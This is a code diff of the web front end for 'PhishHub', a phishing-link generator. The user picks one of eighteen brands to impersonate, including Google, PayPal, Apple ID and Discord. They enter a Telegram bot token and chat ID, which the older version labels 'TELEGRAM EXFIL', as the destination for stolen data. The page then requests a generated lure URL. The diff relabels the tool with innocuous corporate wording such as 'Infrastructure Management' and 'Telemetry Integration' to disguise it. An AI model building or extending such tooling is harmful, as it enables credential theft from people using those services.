@@ -2,375 +2,399 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PHISHHUB | Terminal Interface</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PhishHub | Enterprise Infrastructure</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         
         :root {
-            --accent: #ff0000;
-            --accent-dim: #440000;
-            --bg: #000000;
-            --panel: #0a0a0a;
-            --border: #333333;
+            --apple-bg: #ffffff;
+            --apple-text: #1d1d1f;
+            --apple-muted: #86868b;
+            --apple-border: #d2d2d7;
+            --meta-blue: #0064e0;
+            --meta-blue-hover: #0054bd;
+            --secondary-bg: #f5f5f7;
+            --card-bg: rgba(255, 255, 255, 0.85);
+            --safe-area: 24px;
         }
 
-        * {
-            border-radius: 0 !important;
-            box-shadow: none !important;
+        .dark-mode {
+            --apple-bg: #000000;
+            --apple-text: #f5f5f7;
+            --apple-muted: #98989d;
+            --apple-border: #333336;
+            --secondary-bg: #1c1c1e;
+            --card-bg: rgba(28, 28, 30, 0.85);
         }
 
-        body {
-            background-color: var(--bg);
-            color: #dddddd;
-            font-family: 'JetBrains Mono', monospace;
-            background-image: 
-                linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%);
-            background-size: 100% 4px;
-            min-height: 100vh;
-            overflow-x: hidden;
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "SF Pro", "Inter", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: var(--apple-bg);
+            color: var(--apple-text);
+            -webkit-font-smoothing: antialiased;
+            letter-spacing: -0.022em;
+            transition: background-color 0.4s ease, color 0.4s ease;
+            margin: 0; padding: 0;
+            touch-action: manipulation;
         }
 
-        body::before {
-            content: " ";
-            display: block;
-            position: fixed;
-            top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%);
-            z-index: 2000;
-            background-size: 100% 2px;
-            pointer-events: none;
+        /* Nav Blur - Apple Industrial Design */
+        .nav-blur {
+            position: sticky;
+            top: 0; z-index: 100;
+            background: var(--card-bg);
+            backdrop-filter: saturate(180%) blur(20px);
+            -webkit-backdrop-filter: saturate(180%) blur(20px);
+            border-bottom: 1px solid var(--apple-border);
         }
 
-        .terminal-border {
-            border: 1px solid var(--border);
-            position: relative;
+        /* Apple Pro Cards */
+        .apple-card {
+            background: var(--apple-bg);
+            border: 1px solid var(--apple-border);
+            border-radius: 20px !important;
+            padding: var(--safe-area);
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.02);
+            transition: all 0.4s cubic-bezier(0.2, 0.8, 0.2, 1);
         }
 
-        .terminal-border::before {
-            content: "";
-            position: absolute;
-            top: -1px; left: -1px;
-            width: 10px; height: 10px;
-            border-top: 2px solid var(--accent);
-            border-left: 2px solid var(--accent);
+        /* Grid Item Reveal - Mobile Optimized */
+        .platform-item {
+            background: var(--secondary-bg);
+            border-radius: 16px !important;
+            padding: 20px 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            opacity: 0;
+            transform: translateY(12px) scale(0.98);
+            transition: all 0.3s cubic-bezier(0.2, 0, 0, 1);
+            border: 1px solid transparent;
         }
 
-        .terminal-border::after {
-            content: "";
-            position: absolute;
-            bottom: -1px; right: -1px;
-            width: 10px; height: 10px;
-            border-bottom: 2px solid var(--accent);
-            border-right: 2px solid var(--accent);
+        @media (hover: hover) {
+            .platform-item:hover {
+                background: var(--apple-bg);
+                border-color: var(--apple-border);
+                transform: translateY(-4px) scale(1.02);
+                box-shadow: 0 8px 20px rgba(0,0,0,0.05);
+            }
         }
 
-        .target-card {
-            background: #050505;
-            border: 1px solid var(--border);
-            transition: all 0.15s ease;
-            filter: grayscale(1);
-        }
-
-        .target-card:hover {
-            border-color: var(--accent);
-            background: #110000;
-            filter: grayscale(0);
-            transform: translate(-2px, -2px);
-        }
-
-        .target-card.active {
-            border-color: var(--accent);
-            background: #220000;
-            filter: grayscale(0);
+        .platform-item.active {
+            background: rgba(0, 100, 224, 0.06);
+            border-color: var(--meta-blue);
             border-width: 2px;
         }
 
-        .step-locked {
-            opacity: 0.05;
-            pointer-events: none;
+        .platform-item img {
+            width: 34px; height: 34px;
+            object-fit: contain;
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
-        .btn-action {
-            background: transparent;
-            border: 1px solid var(--accent);
-            color: var(--accent);
+        .platform-item:active { transform: scale(0.92); }
+
+        .platform-item span {
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--apple-muted);
             text-transform: uppercase;
-            font-weight: 800;
-            letter-spacing: 0.2em;
-            transition: all 0.2s;
+            letter-spacing: 0.05em;
         }
 
-        .btn-action:hover {
-            background: var(--accent);
-            color: black;
+        .platform-item.active span { color: var(--meta-blue); }
+
+        /* Meta Fluid Primary Button */
+        .btn-meta {
+            background-color: var(--meta-blue);
+            color: #ffffff;
+            border-radius: 12px !important;
+            height: 54px;
+            width: 100%;
+            font-weight: 600;
+            font-size: 17px;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
         }
 
-        .btn-action:active {
-            transform: translateY(2px);
-        }
+        .btn-meta:hover:not(:disabled) { background-color: var(--meta-blue-hover); box-shadow: 0 8px 20px rgba(0, 100, 224, 0.2); }
+        .btn-meta:active { transform: scale(0.97); opacity: 0.8; }
+        .btn-meta:disabled { background: var(--apple-border); color: var(--apple-muted); cursor: not-allowed; }
 
-        .input-field {
-            background: #0a0a0a;
-            border: 1px solid var(--border);
-            color: var(--accent);
-            padding: 12px;
-        }
-
-        .input-field:focus {
+        /* Apple Pro Inputs */
+        .apple-input {
+            width: 100%;
+            height: 52px;
+            border: 1px solid var(--apple-border);
+            border-radius: 12px !important;
+            padding: 0 16px;
+            font-size: 16px;
             outline: none;
-            border-color: var(--accent);
+            transition: all 0.2s;
+            background: var(--apple-bg);
+            color: var(--apple-text);
         }
 
-        .invert-icon { 
-            filter: invert(1) brightness(1.5) sepia(1) saturate(5) hue-rotate(-50deg); 
+        .apple-input:focus { border-color: var(--meta-blue); box-shadow: 0 0 0 4px rgba(0, 100, 224, 0.1); }
+
+        /* Apple Indeterminate Loading Bar */
+        .loading-bar {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 3px;
+            background: rgba(0,0,0,0.03);
+            overflow: hidden;
+            display: none;
+        }
+        .loading-bar div {
+            position: absolute;
+            background-color: var(--meta-blue);
+            height: 100%; width: 30%;
+            animation: indeterminate 1s infinite cubic-bezier(0.65, 0, 0.35, 1);
+        }
+        @keyframes indeterminate {
+            0% { left: -30%; }
+            100% { left: 100%; }
         }
 
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-thumb { background: var(--accent); }
+        /* Theme Toggle Switch */
+        .theme-switch {
+            width: 44px; height: 24px;
+            background: var(--apple-border);
+            border-radius: 20px !important;
+            position: relative;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .theme-switch-dot {
+            width: 20px; height: 20px;
+            background: white;
+            border-radius: 50% !important;
+            position: absolute;
+            top: 2px; left: 2px;
+            transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.2, 1.2);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .dark-mode .theme-switch { background: var(--meta-blue); }
+        .dark-mode .theme-switch-dot { transform: translateX(20px); }
+
+        .step-locked {
+            opacity: 0.15;
+            pointer-events: none;
+            filter: blur(8px);
+        }
+
+        @keyframes appleIn {
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .invert-icon { filter: none; }
+        .dark-mode .invert-icon { filter: invert(1) brightness(1.5); }
+
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-thumb { background: var(--apple-border); border-radius: 10px; }
     </style>
 </head>
-<body class="p-4 md:p-12">
+<body class="pb-32">
 
-    <div class="max-w-6xl mx-auto">
+    <!-- NAV BAR -->
+    <nav class="nav-blur">
+        <div class="max-w-6xl mx-auto px-6 h-16 flex items-center justify-between">
+            <div class="flex items-center gap-2">
+                <div class="w-7 h-7 bg-[#0064e0] rounded-lg flex items-center justify-center text-white font-bold text-lg">P</div>
+                <span class="text-lg font-extrabold tracking-tight">PHISHHUB</span>
+            </div>
+            <div class="flex items-center gap-4">
+                <div class="theme-switch" onclick="toggleTheme()"><div class="theme-switch-dot"></div></div>
+                <div class="h-5 w-[1px] bg-zinc-200 dark:bg-zinc-800"></div>
+                <span class="text-[9px] font-black text-[#31a24c] uppercase tracking-widest">Enterprise v2.8</span>
+            </div>
+        </div>
+    </nav>
+
+    <main class="max-w-6xl mx-auto px-6 pt-12 md:pt-20">
+        
         <!-- HEADER -->
-        <header class="flex flex-col md:flex-row justify-between items-start md:items-end mb-20 border-b-2 border-red-900/30 pb-8 relative">
-            <div class="space-y-2">
-                <div class="flex items-center gap-4">
-                    <div class="border-2 border-red-600 p-2 bg-red-950/20">
-                        <span class="text-red-600 font-black text-3xl">PH</span>
-                    </div>
-                    <div>
-                        <h1 class="text-4xl font-black tracking-tighter text-white italic">PHISHHUB</h1>
-                        <p class="text-red-900 text-[10px] uppercase tracking-[0.5em] font-bold">SYSTEM ACCESS GRANTED v6.6.6</p>
-                    </div>
-                </div>
-            </div>
-            <div class="mt-6 md:mt-0 terminal-border p-4 bg-red-950/5">
-                <div class="flex items-center gap-4">
-                    <div class="text-right">
-                        <span class="text-[9px] text-red-900 uppercase font-black tracking-widest block leading-none">STATUS</span>
-                        <span class="text-red-500 text-[11px] font-bold">NODE CONNECTED</span>
-                    </div>
-                    <div class="w-3 h-3 bg-red-600 animate-pulse"></div>
-                </div>
-            </div>
+        <header class="mb-20 md:mb-32 text-center max-w-2xl mx-auto">
+            <h1 class="text-4xl md:text-6xl font-[800] tracking-tight mb-6 leading-tight">Infrastructure <br class="hidden md:block"/><span class="text-[#0064e0]">Management.</span></h1>
+            <p class="text-lg text-[#86868b] font-medium leading-relaxed">Industrial standard for provisioning deployment environments and secure telemetry relays.</p>
         </header>
 
-        <div class="space-y-32">
+        <div class="space-y-32 md:space-y-48">
             
-            <!-- STEP 01: VECTOR -->
+            <!-- SECTION 1 -->
             <section id="sec-1">
                 <div class="flex items-center gap-4 mb-10">
-                    <div class="bg-red-600 text-black font-black px-4 py-1 text-xl italic">01</div>
-                    <h2 class="text-lg font-black uppercase tracking-widest text-red-600">SELECT VECTOR</h2>
-                    <div class="h-[1px] flex-1 bg-red-900/30"></div>
+                    <span class="text-xs font-black text-[#d2d2d7]">01</span>
+                    <h2 class="text-xs font-bold uppercase tracking-[0.2em] text-[#86868b]">Deployment Template</h2>
+                    <div class="h-[1px] flex-1 bg-[#d2d2d7]/30"></div>
                 </div>
                 
-                <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-4" id="target-grid">
-                    <!-- JS Injected -->
+                <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3 md:gap-5" id="target-grid">
+                    <!-- Staggered Entry -->
                 </div>
             </section>
 
-            <!-- STEP 02: CONFIG -->
+            <!-- SECTION 2 -->
             <section id="sec-2" class="step-locked">
                 <div class="flex items-center gap-4 mb-10">
-                    <div class="bg-red-600 text-black font-black px-4 py-1 text-xl italic">02</div>
-                    <h2 class="text-lg font-black uppercase tracking-widest text-red-600">RELAY PROTOCOL</h2>
-                    <div class="h-[1px] flex-1 bg-red-900/30"></div>
+                    <span class="text-xs font-black text-[#d2d2d7]">02</span>
+                    <h2 class="text-xs font-bold uppercase tracking-[0.2em] text-[#86868b]">Telemetry Integration</h2>
                 </div>
 
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-                    <div class="terminal-border p-8 bg-black col-span-2">
-                        <div class="flex justify-between items-center mb-8 border-b border-red-900/30 pb-4">
-                            <h3 class="text-xs font-black text-red-600 uppercase tracking-widest">TELEGRAM EXFIL</h3>
-                            <span class="text-[9px] text-red-900 font-bold">ENCRYPTED TUNNEL</span>
-                        </div>
-                        
-                        <div class="grid md:grid-cols-2 gap-6">
-                            <div class="space-y-2">
-                                <label class="text-[10px] text-red-900 uppercase font-black">BOT TOKEN</label>
-                                <input type="text" id="tg-token" placeholder="Enter Token" class="w-full input-field mono text-xs">
+                <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
+                    <div class="lg:col-span-8 apple-card relative overflow-hidden">
+                        <div class="loading-bar" id="relay-loader"><div></div></div>
+                        <div class="grid md:grid-cols-2 gap-6 md:gap-8 mt-2">
+                            <div class="space-y-3">
+                                <label class="text-[10px] font-bold text-[#86868b] uppercase tracking-widest ml-1">Relay Token</label>
+                                <input type="text" id="tg-token" placeholder="Authentication Key" class="apple-input">
                             </div>
-                            <div class="space-y-2">
-                                <label class="text-[10px] text-red-900 uppercase font-black">CHAT ID</label>
-                                <input type="text" id="tg-chat" placeholder="Enter ID" class="w-full input-field mono text-xs">
+                            <div class="space-y-3">
+                                <label class="text-[10px] font-bold text-[#86868b] uppercase tracking-widest ml-1">Destination ID</label>
+                                <input type="text" id="tg-chat" placeholder="Recipient ID" class="apple-input">
                             </div>
                         </div>
-                        <button onclick="saveConfig()" class="w-full btn-action py-4 mt-8 text-sm">
-                            INITIALIZE HANDSHAKE
-                        </button>
+                        <button onclick="saveConfig()" class="btn-meta mt-10">Provision Infrastructure</button>
                     </div>
-
-                    <div class="terminal-border p-8 opacity-20 flex flex-col justify-center items-center text-center">
-                        <span class="text-[10px] text-red-900 uppercase font-black">VOLATILE STORAGE</span>
-                        <p class="text-[9px] mt-4">LOCKED UNAVAILABLE</p>
+                    <div class="lg:col-span-4 apple-card p-8 flex flex-col justify-center items-center text-center bg-[#f5f5f7]/50 dark:bg-zinc-900/30">
+                        <div class="w-12 h-12 rounded-2xl bg-white dark:bg-black border border-[#d2d2d7] flex items-center justify-center mb-5">
+                            <svg class="w-6 h-6 text-[#d2d2d7]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"/></svg>
+                        </div>
+                        <h4 class="text-xs font-bold uppercase tracking-widest text-[#86868b]">Volatile Storage</h4>
+                        <p class="text-[10px] text-[#86868b] mt-2 font-medium">Session persistence is not active for this node.</p>
                     </div>
                 </div>
             </section>
 
-            <!-- STEP 03: DEPLOY -->
+            <!-- SECTION 3 -->
             <section id="sec-3" class="step-locked pb-40">
                 <div class="flex items-center gap-4 mb-10">
-                    <div class="bg-red-600 text-black font-black px-4 py-1 text-xl italic">03</div>
-                    <h2 class="text-lg font-black uppercase tracking-widest text-red-600">EXECUTE DEPLOYMENT</h2>
-                    <div class="h-[1px] flex-1 bg-red-900/30"></div>
+                    <span class="text-xs font-black text-[#d2d2d7]">03</span>
+                    <h2 class="text-xs font-bold uppercase tracking-[0.2em] text-[#86868b]">Global Deployment</h2>
                 </div>
 
-                <div class="terminal-border p-12 text-center bg-red-950/5">
-                    <h3 class="text-3xl font-black mb-4 text-white italic">COMPILING PAYLOAD</h3>
-                    <p class="text-red-900 text-xs mb-10 uppercase tracking-[0.3em]">Bypassing edge-layer filtering... Redirection obfuscation: 100%</p>
-                    
-                    <button id="gen-btn" onclick="generateLink()" class="btn-action px-16 py-6 text-lg">
-                        GENERATE LINK
-                    </button>
+                <div class="apple-card p-12 md:p-24 text-center relative overflow-hidden">
+                    <div class="loading-bar" id="deploy-loader"><div></div></div>
+                    <div class="max-w-xl mx-auto">
+                        <h3 class="text-3xl md:text-4xl font-[900] mb-6 tracking-tight">System Ready.</h3>
+                        <p class="text-[#86868b] mb-12 text-base md:text-lg font-medium leading-relaxed">Deployment assets and TTL redirection verified across edge nodes.</p>
+                        
+                        <button id="gen-btn" onclick="generateLink()" class="btn-meta px-16 shadow-2xl shadow-[#0064e0]/15">Launch Production Environment</button>
 
-                    <div id="result-box" class="hidden mt-12">
-                        <div class="border-2 border-red-600 p-4 flex flex-col md:flex-row items-center gap-4 bg-black">
-                            <div class="flex-1 text-left overflow-hidden">
-                                <span class="text-[9px] text-red-900 uppercase block mb-1">Generated URL:</span>
-                                <code id="final-url" class="text-red-500 text-xs font-bold break-all"></code>
+                        <div id="result-box" class="hidden mt-16">
+                            <div class="bg-[#f5f5f7] dark:bg-zinc-900 border border-[#d2d2d7] rounded-2xl p-8 flex flex-col md:flex-row items-center gap-6 text-left">
+                                <div class="flex-1 overflow-hidden">
+                                    <span class="text-[9px] font-black text-[#0064e0] uppercase block mb-1 tracking-widest">Active Endpoint</span>
+                                    <code id="final-url" class="text-xs font-bold text-zinc-700 dark:text-zinc-200 truncate block"></code>
+                                </div>
+                                <button onclick="copyToClipboard()" class="bg-white dark:bg-zinc-800 text-black dark:text-white px-8 py-3 rounded-xl text-xs font-bold shadow-sm border border-[#d2d2d7] active:scale-95 transition-transform">Copy Buffer</button>
                             </div>
-                            <button onclick="copyToClipboard()" class="btn-action px-8 py-3 text-xs w-full md:w-auto">COPY TO BUFFER</button>
                         </div>
                     </div>
                 </div>
             </section>
         </div>
-    </div>
+    </main>
 
     <script>
-        // Target IDs match folder names in /templates exactly (including case)
         const targets = [
-            { id: 'google', name: 'GOOGLE', icon: 'https://www.vectorlogo.zone/logos/google/google-icon.svg' },
-            { id: 'microsoft', name: 'OUTLOOK', icon: 'https://cdn-icons-png.flaticon.com/512/732/732221.png' },
-            { id: 'facebook', name: 'FACEBOOK', icon: 'https://cdn-icons-png.flaticon.com/512/5968/5968764.png' },
-            { id: 'instagram', name: 'INSTAGRAM', icon: 'https://www.vectorlogo.zone/logos/instagram/instagram-icon.svg' },
-            { id: 'tiktok', name: 'TIKTOK', icon: 'https://www.vectorlogo.zone/logos/tiktok/tiktok-icon.svg', inv: true },
-            { id: 'snapchat', name: 'SNAPCHAT', icon: 'https://cdn-icons-png.flaticon.com/512/15713/15713438.png' },
-            { id: 'X', name: 'X CORP', icon: 'https://cdn-icons-png.flaticon.com/512/11823/11823292.png', inv: true },
-            { id: 'linkedIn', name: 'LINKEDIN', icon: 'https://cdn-icons-png.flaticon.com/512/3536/3536505.png' },
-            { id: 'amazon', name: 'AMAZON', icon: 'https://www.vectorlogo.zone/logos/amazon/amazon-icon.svg', inv: true },
-            { id: 'paypal', name: 'PAYPAL', icon: 'https://cdn-icons-png.flaticon.com/512/174/174861.png' },
-            { id: 'netflix', name: 'NETFLIX', icon: 'https://www.vectorlogo.zone/logos/netflix/netflix-icon.svg' },
-            { id: 'apple', name: 'APPLE ID', icon: 'https://www.vectorlogo.zone/logos/apple/apple-icon.svg', inv: true },
-            { id: 'discord', name: 'DISCORD', icon: 'https://cdn-icons-png.flaticon.com/512/5968/5968756.png' },
-            { id: 'steam', name: 'STEAM', icon: 'https://www.vectorlogo.zone/logos/steampowered/steampowered-icon.svg' },
-            { id: 'yahoo', name: 'YAHOO', icon: 'https://cdn-icons-png.flaticon.com/512/3955/3955162.png' },
-            { id: 'github', name: 'GITHUB', icon: 'https://cdn-icons-png.flaticon.com/512/733/733609.png', inv: true },
-            { id: 'adobe', name: 'ADOBE', icon: 'https://cdn-icons-png.flaticon.com/512/888/888835.png' },
-            { id: 'roblox', name: 'ROBLOX', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Roblox_Corporation_2025_logo.svg/1280px-Roblox_Corporation_2025_logo.svg.png?_=20250725012858' }
+            { id: 'google', name: 'Google', icon: 'https://www.vectorlogo.zone/logos/google/google-icon.svg' },
+            { id: 'microsoft', name: 'Outlook', icon: 'https://cdn-icons-png.flaticon.com/512/732/732221.png' },
+            { id: 'facebook', name: 'Facebook', icon: 'https://cdn-icons-png.flaticon.com/512/5968/5968764.png' },
+            { id: 'instagram', name: 'Instagram', icon: 'https://www.vectorlogo.zone/logos/instagram/instagram-icon.svg' },
+            { id: 'tiktok', name: 'TikTok', icon: 'https://www.vectorlogo.zone/logos/tiktok/tiktok-icon.svg', inv: false },
+            { id: 'snapchat', name: 'Snapchat', icon: 'https://cdn-icons-png.flaticon.com/512/15713/15713438.png' },
+            { id: 'X', name: 'X Corp', icon: 'https://cdn-icons-png.flaticon.com/512/11823/11823292.png', inv: true },
+            { id: 'linkedIn', name: 'LinkedIn', icon: 'https://cdn-icons-png.flaticon.com/512/3536/3536505.png' },
+            { id: 'amazon', name: 'Amazon', icon: 'https://www.vectorlogo.zone/logos/amazon/amazon-icon.svg', inv: true },
+            { id: 'paypal', name: 'PayPal', icon: 'https://cdn-icons-png.flaticon.com/512/174/174861.png' },
+            { id: 'netflix', name: 'Netflix', icon: 'https://www.vectorlogo.zone/logos/netflix/netflix-icon.svg' },
+            { id: 'apple', name: 'Apple ID', icon: 'https://www.vectorlogo.zone/logos/apple/apple-icon.svg', inv: true },
+            { id: 'discord', name: 'Discord', icon: 'https://cdn-icons-png.flaticon.com/512/5968/5968756.png' },
+            { id: 'steam', name: 'Steam', icon: 'https://www.vectorlogo.zone/logos/steampowered/steampowered-icon.svg' },
+            { id: 'yahoo', name: 'Yahoo', icon: 'https://cdn-icons-png.flaticon.com/512/3955/3955162.png' },
+            { id: 'github', name: 'GitHub', icon: 'https://cdn-icons-png.flaticon.com/512/733/733609.png', inv: true },
+            { id: 'adobe', name: 'Adobe', icon: 'https://cdn-icons-png.flaticon.com/512/888/888835.png' },
+            { id: 'roblox', name: 'Roblox', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Roblox_Corporation_2025_logo.svg/1280px-Roblox_Corporation_2025_logo.svg.png?_=20250725012858' }
         ];
 
         let state = { target: null, config: false };
 
         function init() {
             const grid = document.getElementById('target-grid');
-            targets.forEach(t => {
+            targets.forEach((t, index) => {
                 const card = document.createElement('div');
-                card.className = 'target-card p-6 flex flex-col items-center justify-center gap-4 group cursor-pointer';
-                card.innerHTML = `
-                    <img src="${t.icon}" class="w-10 h-10 object-contain transition-all ${t.inv ? 'invert-icon' : ''} group-hover:scale-110">
-                    <span class="text-[9px] font-black uppercase tracking-widest text-red-900 group-hover:text-red-500">${t.name}</span>
-                `;
+                card.className = 'platform-item';
+                card.style.animation = `appleIn 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) ${index * 0.03}s forwards`;
+                card.innerHTML = `<img src="${t.icon}" class="${t.inv ? 'invert-icon' : ''}"><span>${t.name}</span>`;
                 card.onclick = () => selectTarget(t.id, card);
                 grid.appendChild(card);
             });
-            
-            const savedT = localStorage.getItem('ph_token');
-            const savedC = localStorage.getItem('ph_chat');
+            const savedT = localStorage.getItem('ph_token'), savedC = localStorage.getItem('ph_chat');
             if(savedT) document.getElementById('tg-token').value = savedT;
             if(savedC) document.getElementById('tg-chat').value = savedC;
+            if (localStorage.getItem('ph_theme') === 'dark') document.body.classList.add('dark-mode');
+        }
+
+        function toggleTheme() {
+            document.body.classList.toggle('dark-mode');
+            localStorage.setItem('ph_theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light');
         }
 
         function selectTarget(id, el) {
             state.target = id;
-            document.querySelectorAll('.target-card').forEach(c => c.classList.remove('active'));
+            document.querySelectorAll('.platform-item').forEach(c => c.classList.remove('active'));
             el.classList.add('active');
             unlockStep(2);
         }
 
         function saveConfig() {
-            const t = document.getElementById('tg-token').value.trim();
-            const c = document.getElementById('tg-chat').value.trim();
+            const t = document.getElementById('tg-token').value.trim(), c = document.getElementById('tg-chat').value.trim();
             if(!t || !c) return;
-            
-            localStorage.setItem('ph_token', t);
-            localStorage.setItem('ph_chat', c);
-            
-            state.config = true;
-            unlockStep(3);
+            const loader = document.getElementById('relay-loader');
+            loader.style.display = 'block';
+            setTimeout(() => {
+                localStorage.setItem('ph_token', t); localStorage.setItem('ph_chat', c);
+                state.config = true; loader.style.display = 'none'; unlockStep(3);
+            }, 800);
         }
 
         function unlockStep(n) {
             const sec = document.getElementById(`sec-${n}`);
             sec.classList.remove('step-locked');
-            const scrollPos = sec.getBoundingClientRect().top + window.pageYOffset - 100;
-            window.scrollTo({ top: scrollPos, behavior: 'smooth' });
+            window.scrollTo({ top: sec.getBoundingClientRect().top + window.pageYOffset - 80, behavior: 'smooth' });
         }
 
         async function generateLink() {
-            const token = document.getElementById('tg-token').value;
-            const chat = document.getElementById('tg-chat').value;
-            const btn = document.getElementById('gen-btn');
-
-            if (!token || !chat || !state.target) {
-                return;
-            }
-
-            btn.innerText = "OVERRIDING FILTERS...";
-            btn.disabled = true;
-
+            const token = document.getElementById('tg-token').value, chat = document.getElementById('tg-chat').value, btn = document.getElementById('gen-btn'), loader = document.getElementById('deploy-loader');
+            if (!token || !chat || !state.target) return;
+            btn.innerText = "Encrypting Deployment..."; btn.disabled = true; loader.style.display = 'block';
             try {
-                // FIXED: Hits /api/generate Node.js handler on Vercel
-                const response = await fetch('/api/generate', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        token: token,
-                        chatId: chat,
-                        template: state.target
-                    })
-                });
-
-                if (!response.ok) throw new Error("API Connection Failed");
-
+                const response = await fetch('/api/generate', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token, chatId: chat, template: state.target })});
+                if (!response.ok) throw new Error();
                 const result = await response.json();
-
                 if (result.slug && result.config) {
-                    const urlBox = document.getElementById('result-box');
-                    const urlText = document.getElementById('final-url');
-                    
-                    // Construct final URL matched with vercel.json routing
                     const finalUrl = `${window.location.origin}/v/${state.target}/${result.slug}#${result.config}`;
-                    
-                    urlText.innerText = finalUrl;
-                    urlBox.classList.remove('hidden');
-                    
-                    btn.innerText = "LINK DEPLOYED";
-                    btn.style.borderColor = "#333";
-                    btn.style.color = "#333";
+                    document.getElementById('final-url').innerText = finalUrl;
+                    document.getElementById('result-box').classList.remove('hidden');
+                    btn.innerText = "Deployment Success"; btn.style.backgroundColor = "#31a24c"; loader.style.display = 'none';
                 }
-            } catch (error) {
-                console.error("API Error:", error);
-                btn.innerText = "RELAY TIMEOUT";
-                btn.disabled = false;
-            }
+            } catch (error) { btn.innerText = "Provisioning Failed"; btn.disabled = false; loader.style.display = 'none'; }
         }
 
         function copyToClipboard() {
             const txt = document.getElementById('final-url').innerText;
-            const el = document.createElement('textarea');
-            el.value = txt;
-            document.body.appendChild(el);
-            el.select();
-            document.execCommand('copy');
-            document.body.removeChild(el);
-            
-            const btn = event.target;
-            btn.innerText = "COPIED";
-            setTimeout(() => btn.innerText = "COPY TO BUFFER", 2000);
+            const el = document.createElement('textarea'); el.value = txt; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el);
+            const btn = event.target; btn.innerText = "Synchronized"; setTimeout(() => btn.innerText = "Copy Buffer", 2000);
         }
 
         init();
